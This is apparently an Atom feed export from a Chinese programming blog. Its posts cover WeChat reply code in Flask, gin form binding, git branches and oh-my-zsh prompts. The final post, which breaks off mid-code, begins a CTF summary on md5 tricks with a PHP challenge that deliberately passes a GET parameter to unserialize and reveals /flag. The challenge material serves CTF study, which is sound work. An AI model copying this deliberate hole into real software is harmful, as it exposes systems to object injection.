class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Msg</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文本消息回复</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TextMsg</span><span class="params">(Msg)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, toUserName, fromUserName, content)</span>:</span></span><br><span class="line">        self.__dict = dict()</span><br><span class="line">        self.__dict[<span class="string">'ToUserName'</span>] = toUserName</span><br><span class="line">        self.__dict[<span class="string">'FromUserName'</span>] = fromUserName</span><br><span class="line">        self.__dict[<span class="string">'CreateTime'</span>] = int(time.time())</span><br><span class="line">        self.__dict[<span class="string">'Content'</span>] = content</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self)</span>:</span></span><br><span class="line">        xmlform = <span class="string">"""</span></span><br><span class="line"><span class="string">        &lt;xml&gt;</span></span><br><span class="line"><span class="string">        &lt;ToUserName&gt;&lt;![CDATA[&#123;ToUserName&#125;]]&gt;&lt;/ToUserName&gt;</span></span><br><span class="line"><span class="string">        &lt;FromUserName&gt;&lt;![CDATA[&#123;FromUserName&#125;]]&gt;&lt;/FromUserName&gt;</span></span><br><span class="line"><span class="string">        &lt;CreateTime&gt;&#123;CreateTime&#125;&lt;/CreateTime&gt;</span></span><br><span class="line"><span class="string">        &lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt;</span></span><br><span class="line"><span class="string">        &lt;Content&gt;&lt;![CDATA[&#123;Content&#125;]]&gt;&lt;/Content&gt;</span></span><br><span class="line"><span class="string">        &lt;/xml&gt;</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> make_response(xmlform.format(**self.__dict))</span><br></pre></td></tr></table></figure><h1 id="坑3——-被动回复用户消息，回复图文消息"><a href="#坑3——-被动回复用户消息，回复图文消息" class="headerlink" title="坑3—— 被动回复用户消息，回复图文消息"></a>坑3—— 被动回复用户消息，回复图文消息</h1><p>这里已经写好了，直接复制用就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># filename: reply.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Msg</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 图文消息回复</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">News</span><span class="params">(Msg)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, toUserName, fromUserName,sourceList)</span>:</span></span><br><span class="line">        self.toUserName = toUserName</span><br><span class="line">        self.fromUserName = fromUserName</span><br><span class="line">        self.CreateTime = int(time.time())</span><br><span class="line">        self.ArticleCount = len(sourceList)</span><br><span class="line">        self.SourceList = sourceList</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.itemxml = []</span><br><span class="line">        <span class="keyword">for</span> source <span class="keyword">in</span> self.SourceList:</span><br><span class="line">            <span class="comment"># source = [title1, description1, picurl, url]</span></span><br><span class="line">            singlexml = <span class="string">"""</span></span><br><span class="line"><span class="string">                        &lt;item&gt;</span></span><br><span class="line"><span class="string">                            &lt;Title&gt;&lt;![CDATA[%s]]&gt;&lt;/Title&gt;</span></span><br><span class="line"><span class="string">                            &lt;Description&gt;&lt;![CDATA[%s]]&gt;&lt;/Description&gt;</span></span><br><span class="line"><span class="string">                            &lt;PicUrl&gt;&lt;![CDATA[%s]]&gt;&lt;/PicUrl&gt;</span></span><br><span class="line"><span class="string">                            &lt;Url&gt;&lt;![CDATA[%s]]&gt;&lt;/Url&gt;</span></span><br><span class="line"><span class="string">                        &lt;/item&gt;</span></span><br><span class="line"><span class="string">                    """</span> % (source[<span class="number">0</span>], source[<span class="number">1</span>], source[<span class="number">2</span>], source[<span class="number">3</span>])</span><br><span class="line">            self.itemxml.append(singlexml)</span><br><span class="line"></span><br><span class="line">        xmlform = <span class="string">"""</span></span><br><span class="line"><span class="string">                    &lt;xml&gt;</span></span><br><span class="line"><span class="string">                        &lt;ToUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/ToUserName&gt;</span></span><br><span class="line"><span class="string">                        &lt;FromUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/FromUserName&gt;</span></span><br><span class="line"><span class="string">                        &lt;CreateTime&gt;%s&lt;/CreateTime&gt;</span></span><br><span class="line"><span class="string">                        &lt;MsgType&gt;&lt;![CDATA[news]]&gt;&lt;/MsgType&gt;</span></span><br><span class="line"><span class="string">                        &lt;ArticleCount&gt;%d&lt;/ArticleCount&gt;</span></span><br><span class="line"><span class="string">                        &lt;Articles&gt;</span></span><br><span class="line"><span class="string">                            %s</span></span><br><span class="line"><span class="string">                        &lt;/Articles&gt;</span></span><br><span class="line"><span class="string">                    &lt;/xml&gt;</span></span><br><span class="line"><span class="string">                """</span> % (self.toUserName, self.fromUserName, self.CreateTime, self.ArticleCount, <span class="string">" "</span>.join(self.itemxml))</span><br><span class="line">        <span class="keyword">return</span> make_response(xmlform)</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><p><a href="https://segmentfault.com/q/1010000009235017#" target="_blank" rel="noopener">flask-restful 中文返回的响应变成了 unicode literal</a></p></li><li><p><a href="https://www.cnblogs.com/chjxbt/p/10500041.html" target="_blank" rel="noopener">微信公众号开发被动回复用户消息，回复内容Content使用了”\n”换行符还是没有换行</a></p></li><li><a href="https://blog.csdn.net/ksearch/article/details/42239863" target="_blank" rel="noopener">用python开发微信图文消息回复系统——新闻检索系统</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;微信公众号开发遇到的一些坑，这里记录一下&lt;/p&gt;
    
    </summary>
    
      <category term="微信公众号开发" scheme="http://0clickjacking0.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>gin绑定表单数据与结构体遇到坑的一些总结</title>
    <link href="http://0clickjacking0.github.io/2021/02/04/gin%E7%BB%91%E5%AE%9A%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93%E9%81%87%E5%88%B0%E5%9D%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2021/02/04/gin绑定表单数据与结构体遇到坑的一些总结/</id>
    <published>2021-02-04T10:55:23.000Z</published>
    <updated>2021-02-12T08:05:22.072Z</updated>
    
    <content type="html"><![CDATA[<p>Some summary of gin binding form data and structure encounter pits</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在公司做某个项目的时候遇到了gin绑定表单数据与结构体的一些问题，困扰了挺久的，终于解决了，在此记录一下。</p><h1 id="坑1-绑定表单字符串数组与结构体"><a href="#坑1-绑定表单字符串数组与结构体" class="headerlink" title="坑1 绑定表单字符串数组与结构体"></a>坑1 绑定表单字符串数组与结构体</h1><p><code>form.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Check some colors<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"red"</span>&gt;</span>Red<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"colors[]"</span> <span class="attr">value</span>=<span class="string">"red"</span> <span class="attr">id</span>=<span class="string">"red"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"green"</span>&gt;</span>Green<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"colors[]"</span> <span class="attr">value</span>=<span class="string">"green"</span> <span class="attr">id</span>=<span class="string">"green"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"blue"</span>&gt;</span>Blue<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"colors[]"</span> <span class="attr">value</span>=<span class="string">"blue"</span> <span class="attr">id</span>=<span class="string">"blue"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"Student"</span>&gt;</span>Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"Student"</span>&gt;</span>Age:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"age"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>main.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="keyword">string</span> <span class="string">`form:"name"`</span></span><br><span class="line">Age   <span class="keyword">int</span>    <span class="string">`form:"age"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> myForm <span class="keyword">struct</span> &#123;</span><br><span class="line">Colors []<span class="keyword">string</span><span class="string">`form:"colors[]"`</span></span><br><span class="line">Students Student</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.LoadHTMLGlob(<span class="string">"views/*"</span>)</span><br><span class="line">r.GET(<span class="string">"/"</span>, indexHandler)</span><br><span class="line">r.POST(<span class="string">"/"</span>, formHandler)</span><br><span class="line">r.Run(<span class="string">":10000"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">indexHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">"form.html"</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">formHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> fakeForm myForm</span><br><span class="line">c.Bind(&amp;fakeForm)</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line"><span class="string">"color"</span>: fakeForm.Colors,</span><br><span class="line"><span class="string">"students"</span> : fakeForm.Students,</span><br><span class="line">&#125;)</span><br><span class="line">fmt.Println(fakeForm)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提交后的效果如下图，这里还是比较简单的。</p><p><img src="http://images.xianyu123.club/20210204190402.png" alt="image-20210204190356735"></p><p><img src="http://images.xianyu123.club/20210204190419.png" alt="image-20210204190419952"></p><h1 id="坑2-绑定表单结构体数组"><a href="#坑2-绑定表单结构体数组" class="headerlink" title="坑2 绑定表单结构体数组"></a>坑2 绑定表单结构体数组</h1><p><code>main.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="keyword">string</span> <span class="string">`json:"name"`</span></span><br><span class="line">Age   <span class="keyword">int</span>    <span class="string">`json:"age"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> myForm <span class="keyword">struct</span> &#123;</span><br><span class="line">Students []Student <span class="string">`json:"students"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.LoadHTMLGlob(<span class="string">"views/*"</span>)</span><br><span class="line">r.GET(<span class="string">"/"</span>, indexHandler)</span><br><span class="line">r.POST(<span class="string">"/test"</span>, formHandler)</span><br><span class="line">r.Run(<span class="string">":10000"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">indexHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">"form.html"</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">formHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> fakeForm myForm</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := c.BindJSON(&amp;fakeForm); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//log.Fatal(err)</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(fakeForm.Students)</span><br><span class="line">c.JSON(http.StatusOK, fakeForm)</span><br><span class="line"></span><br><span class="line">fmt.Println(fakeForm)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入json即可</p><p><img src="http://images.xianyu123.club/20210211234658.png" alt="image-20210211234658717"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://segmentfault.com/q/1010000021179386/a-1020000021180162#" target="_blank" rel="noopener">go binding如何绑定结构体数组</a></p><p><a href="https://github.com/gin-gonic/gin/issues/715" target="_blank" rel="noopener">Question: How bind JSON array</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Some summary of gin binding form data and structure encounter pits&lt;/p&gt;
    
    </summary>
    
      <category term="Go" scheme="http://0clickjacking0.github.io/categories/Go/"/>
    
    
  </entry>
  
  <entry>
    <title>git创建远程分支</title>
    <link href="http://0clickjacking0.github.io/2021/01/29/git%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF/"/>
    <id>http://0clickjacking0.github.io/2021/01/29/git创建远程分支/</id>
    <published>2021-01-29T03:04:24.000Z</published>
    <updated>2021-02-03T09:57:14.424Z</updated>
    
    <content type="html"><![CDATA[<p>工作的时候遇到，这里记录一下</p><a id="more"></a><p>假设当前分支为master，需要创建的分支是hello</p><h3 id="1-新建远程分支"><a href="#1-新建远程分支" class="headerlink" title="1. 新建远程分支"></a>1. 新建远程分支</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b hello  //在当前分支下创建hello的本地分支分支</span><br></pre></td></tr></table></figure><h3 id="2-把新建的本地分支push到远程服务器，远程分支与本地分支同名（当然可以随意起名）"><a href="#2-把新建的本地分支push到远程服务器，远程分支与本地分支同名（当然可以随意起名）" class="headerlink" title="2. 把新建的本地分支push到远程服务器，远程分支与本地分支同名（当然可以随意起名）"></a>2. 把新建的本地分支<strong>push</strong>到远程服务器，远程分支与本地分支同名（当然可以随意起名）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin hello:hello</span><br></pre></td></tr></table></figure><h3 id="3-查看远程分支"><a href="#3-查看远程分支" class="headerlink" title="3. 查看远程分支"></a>3. 查看远程分支</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -a     //查看远程分支</span><br></pre></td></tr></table></figure><h3 id="4-修改本地文件后，推送到远程仓库"><a href="#4-修改本地文件后，推送到远程仓库" class="headerlink" title="4. 修改本地文件后，推送到远程仓库"></a>4. 修改本地文件后，推送到远程仓库</h3><h4 id="添加commit"><a href="#添加commit" class="headerlink" title="添加commit"></a>添加commit</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -a</span><br></pre></td></tr></table></figure><h4 id="将修改推送到远程分支"><a href="#将修改推送到远程分支" class="headerlink" title="将修改推送到远程分支"></a>将修改推送到远程分支</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin hello:hello</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;工作的时候遇到，这里记录一下&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>oh-my-zsh隐藏用户名或者主机名</title>
    <link href="http://0clickjacking0.github.io/2020/10/04/oh-my-zsh%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E5%90%8D%E6%88%96%E8%80%85%E4%B8%BB%E6%9C%BA%E5%90%8D/"/>
    <id>http://0clickjacking0.github.io/2020/10/04/oh-my-zsh隐藏用户名或者主机名/</id>
    <published>2020-10-04T07:29:04.000Z</published>
    <updated>2020-10-04T07:31:19.904Z</updated>
    
    <content type="html"><![CDATA[<p>oh-my-zsh隐藏用户名或者主机名</p><a id="more"></a><p>修改<code>vim ~/.zshrc</code>文件,在文件底部增加</p><h2 id="隐藏用户名和主机名"><a href="#隐藏用户名和主机名" class="headerlink" title="隐藏用户名和主机名"></a>隐藏用户名和主机名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prompt_context() &#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="只保留用户名，隐藏主机名"><a href="#只保留用户名，隐藏主机名" class="headerlink" title="只保留用户名，隐藏主机名"></a>只保留用户名，隐藏主机名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">prompt_context() &#123;</span><br><span class="line">  if [[ &quot;$USER&quot; != &quot;$DEFAULT_USER&quot; || -n &quot;$SSH_CLIENT&quot; ]]; then</span><br><span class="line">    prompt_segment black default &quot;%(!.%&#123;%F&#123;yellow&#125;%&#125;.)$USER&quot;</span><br><span class="line">  fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="只保留主机名，隐藏用户名"><a href="#只保留主机名，隐藏用户名" class="headerlink" title="只保留主机名，隐藏用户名"></a>只保留主机名，隐藏用户名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">prompt_context() &#123;</span><br><span class="line">  if [[ &quot;$USER&quot; != &quot;$DEFAULT_USER&quot; || -n &quot;$SSH_CLIENT&quot; ]]; then</span><br><span class="line">    prompt_segment black default &quot;%(!.%&#123;%F&#123;yellow&#125;%&#125;.)$HOST&quot;</span><br><span class="line">  fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改后执行 <code>source ~/.zshrc</code>才能生效</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;oh-my-zsh隐藏用户名或者主机名&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF中关于md5的一些总结</title>
    <link href="http://0clickjacking0.github.io/2020/08/24/CTF%E4%B8%AD%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2020/08/24/CTF中关于md5的一些总结/</id>
    <published>2020-08-24T06:54:15.000Z</published>
    <updated>2020-09-06T14:15:33.712Z</updated>
    
    <content type="html"><![CDATA[<p>CTF中关于md5的一些总结</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打了挺多ctf，碰到挺多关于md5的一些问题，或者一些变种的题目，虽然已经是烂大街的问题了，但是还是需要总结一下，方便下次比赛可以直接用脚本</p><h1 id="CTF中的一些案例"><a href="#CTF中的一些案例" class="headerlink" title="CTF中的一些案例"></a>CTF中的一些案例</h1><h2 id="案例1——ciscn2020初赛——easytrick"><a href="#案例1——ciscn2020初赛——easytrick" class="headerlink" title="案例1——ciscn2020初赛——easytrick"></a>案例1——ciscn2020初赛——easytrick</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span 